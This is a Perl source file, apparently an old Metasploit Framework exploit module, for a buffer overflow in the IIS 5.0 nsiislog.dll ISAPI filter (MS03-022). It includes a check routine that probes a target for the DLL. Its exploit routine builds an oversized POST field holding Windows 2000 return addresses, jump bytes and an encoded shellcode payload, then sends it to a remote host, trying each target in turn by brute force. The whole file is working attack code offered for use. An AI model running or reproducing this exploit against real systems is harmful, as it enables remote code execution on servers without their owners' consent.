package Msf::Exploit::iis50_nsiislog_post;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'IIS 5.0 nsiislog.dll POST Overflow',
    'Version'  => '$Revision: 1.23 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Space'  => 1024,
                 'BadChars'  => "\x00+&=%\x0a\x0d\x20",
                 },
    
    'Description'  => qq{
        This exploits a buffer overflow found in the nsiislog.dll
        ISAPI filter that comes with Windows Media Server. This
        module will also work against the 'patched' MS03-019
        version.
    },

    'Refs'  =>  [
                    'http://www.osvdb.org/4535',
                    'http://www.microsoft.com/technet/security/bulletin/MS03-022.mspx',
                    'http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0120.html'
                ],
    'DefaultTarget' => 0,
    'Targets' => [
                   ['Windows 2000 Brute Force', 0, 0],
                   ['Windows 2000 Pre-MS03-019',   9769, 0x40f01333],
                   ['Windows 2000 Post-MS03-019', 13869, 0x40f01353],
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    
    my $s = Msf::Socket->new( {"SSL" => $self->GetVar("SSL")} );
    if (! $s->Tcp($target_host, $target_port))
    {
        $self->SetError($s->GetError);
        return undef;
    }

    $s->Send("GET /scripts/nsiislog.dll HTTP/1.1\r\nHost: $target_host:$target_port\r\n\r\n");

    my $r = $s->Recv(-1, 5);

    if ($r =~ /NetShow ISAPI/)
    {
        $self->PrintLine("[*] Found /scripts/nsiislog.dll ;)");
        return(1);
    } else {
        
        $self->PrintLine("The nsiislog.dll ISAPI does not appear to be installed");
        return(0);
    }
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

    my @targets = @{$self->Targets};
    if ($target_idx == 0)
    {
        shift(@targets);
    } else {
        @targets = ( $targets[$target_idx] );
    }

    foreach my $target (@targets)
    {
        $self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

        my $request =
        "POST /scripts/nsiislog.dll HTTP/1.1\r\n".
        "Host: $target_host:$target_port\r\n".
        "User-Agent: NSPlayer/2.0\r\n".
        "Content-Type: application/x-www-form-urlencoded\r\n";

        my @fields = split(/\s+/, "date time c-dns cs-uri-stem c-starttime ".
                                  "x-duration c-rate c-status c-playerid c-playerversion ".
                                  "c-playerlanguage cs(User-Agent) cs(Referer) c-hostexe ");                         
        my $boom;
        foreach my $var (@fields) { $boom .= "$var=BOOM&"; }

        my $pattern = "M" x 65535;

        substr($pattern, $target->[1],  4, pack("V", $target->[2]));
        substr($pattern, $target->[1] - 4, 4, "\xeb\x08\xeb\x08");
        substr($pattern, $target->[1] + 4, length($shellcode), $shellcode);

        $boom .= "c-ip=" . $pattern;
        $request .= "Content-Length: " . length($boom) . "\r\n\r\n" . $boom;
        
        my $s = Msf::Socket->new({"SSL" => $self->GetVar("SSL")});
        if (! $s->Tcp($target_host, $target_port))
        {
            $self->PrintLine("[*] Error: could not connect: " . $s->GetError());
            return;
        }

        $self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
        $s->Send($request);
        
        $self->PrintLine("[*] Waiting for a response...");
        my $r = $s->Recv(-1, 5);
        sleep(2);
        $s->Close();
    }
    
    return;
}

